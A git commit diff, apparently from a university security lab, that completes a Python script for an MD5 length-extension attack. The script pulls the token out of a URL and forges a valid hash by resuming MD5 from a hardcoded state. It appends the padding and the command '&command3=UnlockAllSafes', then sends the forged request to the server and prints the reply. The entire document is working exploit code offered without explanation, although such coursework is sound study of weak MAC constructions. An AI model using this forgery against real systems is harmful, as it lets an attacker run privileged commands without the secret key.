f68cb71e1ecfaea95f753519b3181b1d755d651e
Josh Rehm <jrehm135@vt.edu>
2018-08-30 19:21:45 -0400

    finished

--- len_ext_attack.py
+++ len_ext_attack.py
@@ -4,29 +4,29 @@ import urllib
 
 url = sys.argv[1]
 
-length_of_m = 76
-m_bits = (length_of_m + len(padding(length_of_m * 8)))* 8
+tokenLoc = url.find("token=") + 6
+endLoc = url.find("&user=")
+msgLoc = endLoc + 1
+
+m_hash = "password" + url[msgLoc:]
+m_len = len(m_hash)
+
+m_bits = (m_len + len(padding(m_len * 8)))* 8
 
 h = md5(state="402a574d265dc212ee64970f159575d0".decode("hex"), count=m_bits)
 
 x = "&command3=UnlockAllSafes"
 h.update(x)
-# print h.hexdigest()
 
-tokenLoc = url.find("402a574d265dc212ee64970f159575d0")
-endLoc = url.find("&user=admin&command1=ListFiles&command2=NoOp")
-updatedURL = url[:tokenLoc] + h.hexdigest() + url[endLoc:] + x
+x_padding = urllib.quote(padding(m_len*8))
 
-urllen1 = "________" + url[endLoc:] + x
-urllen2 = len(urllen1)
+padded_msg = url[msgLoc:] + x_padding + x
 
-print urllen1
-print urllen2
+updatedURL = url[:tokenLoc] + h.hexdigest() + "&" + padded_msg
 
 print updatedURL
 
 parsedUrl = urlparse.urlparse(updatedURL)
-
 conn = httplib.HTTPSConnection(parsedUrl.hostname,parsedUrl.port)
 conn.request("GET", parsedUrl.path + "?" + parsedUrl.query)
 print conn.getresponse().read()
